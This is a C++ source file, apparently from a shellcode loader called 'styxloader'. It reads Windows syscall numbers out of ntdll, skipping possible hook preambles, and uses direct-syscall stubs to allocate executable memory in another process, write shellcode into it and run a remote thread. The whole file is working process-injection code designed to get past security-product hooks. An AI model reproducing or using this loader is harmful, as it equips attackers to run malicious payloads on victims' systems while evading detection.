#include "styxloader/direct_syscall.hpp"

#include <windows.h>
#include <iostream>

// MASM stubs (defined in modules/asm/styx_syscalls.asm, added in commit 3).
// Each stub:
//   1. Reads the SSN from a corresponding global variable (g_ssn_<name>)
//      that we set at runtime via GetSyscallNumber().
//   2. Marshals Win64 calling-convention args into the syscall ABI
//      (rcx -> r10, rdx/r8/r9 stay, args 5+ stay on stack).
//   3. Executes 'syscall' and returns NTSTATUS in eax.
//
// Audit note: the original code used MSVC inline __asm blocks which are
// (a) not supported on MSVC x64 and (b) contained 'mov rdx, rdx' NOPs
// that failed to load any actual arguments. The MASM stubs in commit 3
// fix both issues.
extern "C" {
    NTSTATUS StyxNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS StyxNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    // POBJECT_ATTRIBUTES / PPS_ATTRIBUTE_LIST are not in <windows.h> (they
    // live in <winternl.h> / <ntifs.h>). We always pass NULL for these, so
    // declare them as PVOID to avoid pulling in NT internals headers.
    NTSTATUS StyxNtCreateThreadEx(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
}

// SSN globals, set by GetSyscallNumber() and read by the MASM stubs.
extern "C" {
    DWORD g_ssn_NtAllocateVirtualMemory = 0;
    DWORD g_ssn_NtWriteVirtualMemory = 0;
    DWORD g_ssn_NtCreateThreadEx = 0;
}

namespace styxloader {

ULONG GetSyscallNumber(const char* syscallName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    FARPROC funcAddr = GetProcAddress(hNtdll, syscallName);
    if (!funcAddr) return 0;

    // Parse the ntdll stub looking for the pattern
    //   mov eax, imm32   (B8 ?? ?? ?? ??)
    //   syscall          (0F 05)
    // The pattern starts at offset 0 in unhooked stubs, but we scan the
    // first 50 bytes in case a hook inserted a JMP preamble.
    unsigned char* p = (unsigned char*)funcAddr;
    for (int i = 0; i < 50; ++i) {
        if (p[i] == 0xB8 && p[i + 5] == 0x0F && p[i + 6] == 0x05) {
            return *(ULONG*)(p + i + 1);
        }
    }
    return 0;  // Fallback if not found
}

bool DirectInject(HANDLE hProcess, PVOID shellcode, SIZE_T size) {
    PVOID pRemoteMemory = NULL;
    SIZE_T allocSize = size;

    // Resolve SSNs at runtime (dynamic mapping — adapts to Windows builds)
    g_ssn_NtAllocateVirtualMemory = GetSyscallNumber("NtAllocateVirtualMemory");
    g_ssn_NtWriteVirtualMemory    = GetSyscallNumber("NtWriteVirtualMemory");
    g_ssn_NtCreateThreadEx        = GetSyscallNumber("NtCreateThreadEx");

    if (!g_ssn_NtAllocateVirtualMemory || !g_ssn_NtWriteVirtualMemory || !g_ssn_NtCreateThreadEx) {
        std::cout << "Error getting syscall numbers." << std::endl;
        return false;
    }

    // Allocate memory in target process via direct syscall
    NTSTATUS status = StyxNtAllocateVirtualMemory(
        hProcess, &pRemoteMemory, 0, &allocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        std::cout << "Error in NtAllocateVirtualMemory: " << status << std::endl;
        return false;
    }

    // Write shellcode via direct syscall
    SIZE_T bytesWritten = 0;
    status = StyxNtWriteVirtualMemory(
        hProcess, pRemoteMemory, shellcode, size, &bytesWritten);
    if (status != 0) {
        std::cout << "Error in NtWriteVirtualMemory: " << status << std::endl;
        return false;
    }

    // Create remote thread via direct syscall
    HANDLE hThread = NULL;
    status = StyxNtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        pRemoteMemory, NULL, 0, 0, 0, 0, NULL);
    if (status != 0) {
        std::cout << "Error in NtCreateThreadEx: " << status << std::endl;
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return true;
}

}  // namespace styxloader
